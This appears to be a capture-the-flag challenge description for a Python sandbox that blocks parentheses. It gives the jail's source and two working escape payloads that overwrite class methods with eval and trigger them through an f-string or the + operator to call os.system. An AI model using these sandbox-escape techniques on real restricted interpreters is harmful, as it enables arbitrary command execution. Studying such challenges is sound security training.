### Description

PYJAIL TIME!!!  
Somehow call os.system, and get a shell.  
(There can be more than one solution.)

Hint:
    - It uses latest python3.7.2  
    - You may use some new features of python 3.6, OR NOT.  

```
import sys

class Pyjail():
    def __init__(self):
        self.blacklist = []
    def run_code(self, src):
        if not self.is_safe(src):
            print("Bad character was found! Go away!")
            return
        exec(src)
    def is_safe(self, src):
        if list(filter(lambda bad: bad in src, self.blacklist)):
            return False
        return True
    def add_blacklist(self, blacklist):
        if type(blacklist) == "list":
            self.blacklist.extend(blacklist)
        elif type(blacklist) == "str":
            self.blacklist.extend(list(blacklist))


jail = Pyjail()
jail.add_blacklist('()')

print("Give me a python code to execute")
print("Ah! Please make sure there aren't any PARENTHESES... '(', ')'")
print("* To submit code, just ctrl+D")

code = ''.join(sys.stdin.readlines())
del sys
jail.run_code(code)
```

### Environment

python 3.7.2 (virtualenv or pyenv)  
From stdin, get python codes as a multiline input until EOF.  

User input 을 python3 jail.py 의 stdin 으로 넘겨주세요.  

### Concept

Pyjail without parentheses / Triggering functions without using parentheses

### solution (two intended solution)

1. [version-specific (python3 >= 3.6)] Use f-string syntax, which added in python 3.6  
```
jail.__class__.__format__ = eval
for t in ["__import__\x28'os'\x29.system\x28'ls'\x29"]: pass
f"{jail:{t}}"
```  
 
2. [not version-specific] Overwrite \_\_add\_\_ of writable class 'Pyjail' with eval, and trigger eval with + operator  
```
Pyjail.__add__ = eval
jail + "__import__\x28'os'\x29.system\x28'ls'\x29"
```
